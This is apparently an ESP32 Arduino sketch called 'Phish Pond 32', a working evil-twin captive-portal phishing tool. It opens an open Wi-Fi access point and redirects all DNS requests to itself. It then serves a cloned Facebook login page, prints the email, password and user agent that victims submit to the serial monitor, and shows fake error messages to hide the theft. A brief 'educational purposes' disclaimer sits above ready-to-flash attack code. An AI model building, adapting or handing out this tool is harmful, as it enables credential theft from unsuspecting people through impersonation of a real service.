//Phish Pond 32 [PP32]
//ESP32 Wifi Fake Captive Portal by KleinZxA
//If You are encountering errors, Use Versions 3.0.7 or Below
//Captured Credentials Are Printed Via Serial.println();
//Warning! It is illegal to steal credentials without permissions. Do this at your own risk.
//This is only for Educational Purposes
//
//This Example Uses Facebook Login Page.
//You can Edit and use any Login Page you want.

#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>  // Include for setting transmission power Might be Unnecessary to Most Dev Boards


const char *ssid = "."; //change your AP name ex: Free Wifi
AsyncWebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
IPAddress local_IP(172, 16, 42, 2);
IPAddress gateway(172, 16, 42, 2);
IPAddress subnet(255, 255, 255, 0);

const char *loginPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Roboto", sans-serif;
    }

    .res {
        display: flex;
        align-items: center;
    }

    .row {
        padding: 0 15px;
        min-height: 100vh;
        justify-content: center;
        background: #f0f2f5;
    }

    .fb-form {
        justify-content: space-between;
        max-width: 1000px;
        width: 100%;
    }

    .fb-form .card {
        margin-bottom: 90px;
    }

    .fb-form h1 {
        color: #1877f2;
        font-size: 4rem;
        margin-bottom: 10px;
    }

    .fb-form p {
        font-size: 1.75rem;
        white-space: nowrap;
    }

    form {
        display: flex;
        flex-direction: column;
        background: #fff;
        border-radius: 8px;
        padding: 20px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
        max-width: 400px;
        width: 100%;
    }

    form input {
        height: 55px;
        width: 100%;
        border: 1px solid #ccc;
        border-radius: 6px;
        margin-bottom: 15px;
        font-size: 1rem;
        padding: 0 14px;
    }

    form input:focus {
        outline: none;
        border-color: #1877f2;
    }

    ::placeholder {
        color: #777;
        font-size: 1.063rem;
    }

    .fb-submit {
        display: flex;
        flex-direction: column;
        text-align: center;
        gap: 15px;
    }

    .fb-submit .login {
        border: none;
        outline: none;
        cursor: pointer;
        background: #1877f2;
        padding: 15px 0;
        border-radius: 6px;
        color: #fff;
        font-size: 1.25rem;
        font-weight: 600;
        transition: 0.2s ease;
    }

    .fb-submit .login:hover {
        background: #0d65d9;
    }

    form a {
        text-decoration: none;
    }

    .fb-submit .forgot {
        color: #1877f2;
        font-size: 0.875rem;
    }

    .fb-submit .forgot:hover {
        text-decoration: underline;
    }

    hr {
        border: none;
        height: 1px;
        background-color: #ccc;
        margin-bottom: 20px;
        margin-top: 20px;
    }

    .button {
        margin-top: 25px;
        text-align: center;
        margin-bottom: 20px;
    }

    .button a {
        padding: 15px 20px;
        background: #42b72a;
        border-radius: 6px;
        color: #fff;
        font-size: 1.063rem;
        font-weight: 600;
        transition: 0.2s ease;
    }

    .button a:hover {
        background: #3ba626;
    }

    .footer-langs {
        max-width: 1000px;
        margin: 0 auto;
        padding: 20px;
    }

    footer ol {
        display: flex;
        flex-wrap: wrap;
        list-style-type: none;
        padding: 8px 0;

        margin-left: 3vh;
    }

    footer ol:first-child {
        border-bottom: 1px solid #dddfe2;
    }

    footer ol:first-child li:last-child button {
        background-color: #f5f6f7;
        border: 1px solid #ccd0d5;
        outline: none;
        color: #4b4f56;
        padding: 0 8px;
        font-weight: 700;
        font-size: 12px;
    }

    footer ol li {
        padding-right: 20px;
        font-size: 12px;
        color: #8a8d91;
    }

    footer ol li a {
        text-decoration: none;
        color: #8a8d91;
    }

    footer ol li a:hover {
        text-decoration: underline;
    }

    footer small {
        font-size: 12px;
        color: #8a8d91;
        margin-left: 3vh;
    }

    @media (max-width: 900px) {
        .fb-form {
            flex-direction: column;
            text-align: center;
        }

        .fb-form .card {
            margin-bottom: 30px;
        }
    }

    @media (max-width: 460px) {
        .fb-form h1 {
            font-size: 3.5rem;
        }

        .fb-form p {
            font-size: 1.3rem;
        }

        form {
            padding: 15px;
        }
    }
    </style>
</head>
<body>
    <div class="row res">
        <div class="fb-form res">
            <div class="card">
                <h1>facebook</h1>
                <p>Connect with friends and the world </p>
                <p> around you on Facebook.</p>
            </div>
            <form onsubmit="return login(event)">
                <input type="email" placeholder="Email or phone number" id="email" required>
                <input type="password" placeholder="Password" id="password" required>
                <div class="fb-submit">
                    <button type="submit" class="login">Login</button>
                    <a onclick="error();" class="forgot">Forgot password?</a>
                </div>
                <hr>
                <div class="button">
                    <a onclick="error();">Create new account</a>
                </div>
            </form>
        </div>
    </div>
    <script>
        function login(event) {
            event.preventDefault(); // Prevent form from submitting by default

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            if (!email || !password) {
              alert("Please fill out both fields.");
              return false;
            }
            // Send credentials to ESP32
            fetch("/credentials", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
            }).then(response => {
                if (response.ok) {
                    alert("Internal Server Error Please Try Again Later");
                } else {
                    alert("Failed to Submit Request");
                }
            });
        }
        function error(){
          alert("Internal Server Error Please try again Later");
        }
    </script>
</body>
</html>
)rawliteral";

void setup() {
    Serial.begin(115200);
    WiFi.mode(WIFI_AP);

    // Set Wi-Fi TX power right after setting WiFi mode
    esp_wifi_set_max_tx_power(40); //Comment this out if You are not using YD-ESP32-S3 Board

    if (!WiFi.softAPConfig(local_IP, gateway, subnet)) {
        Serial.println("Failed to configure AP");
    }

    if (WiFi.softAP(ssid)) {
        Serial.println("Access Point started successfully!");
        Serial.print("AP IP address: ");
        Serial.println(WiFi.softAPIP());
    } else {
        Serial.println("Failed to start AP");
    }

    // Start DNS hijacking
    dnsServer.start(DNS_PORT, "*", local_IP);  // Capture all DNS requests

    // Serve the login page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", loginPage);
    });

    // Force all unmatched routes to redirect to the main login page
    server.onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("/");
    });

    // Handle credential submission
    server.on("/credentials", HTTP_POST, [](AsyncWebServerRequest *request) {
        String email = "";
        String password = "";
        String userAgent = request->header("User-Agent");

        if (request->hasParam("email", true) && request->hasParam("password", true)) {
            email = request->getParam("email", true)->value();
            password = request->getParam("password", true)->value();

            // Print to Serial Monitor
            Serial.println("------------------------------------------");
            Serial.println("Received credentials:");
            Serial.println("Email: " + email);
            Serial.println("Password: " + password);
            Serial.println("User Agent: " + userAgent);
            Serial.println("------------------------------------------");
        }
        request->send(200, "text/plain", "Credentials received");
        WiFi.disconnect(true);
    });

    server.begin();
    Serial.println("Server started!");
}

void loop() {
  dnsServer.processNextRequest();  // Process DNS requests for redirection
}
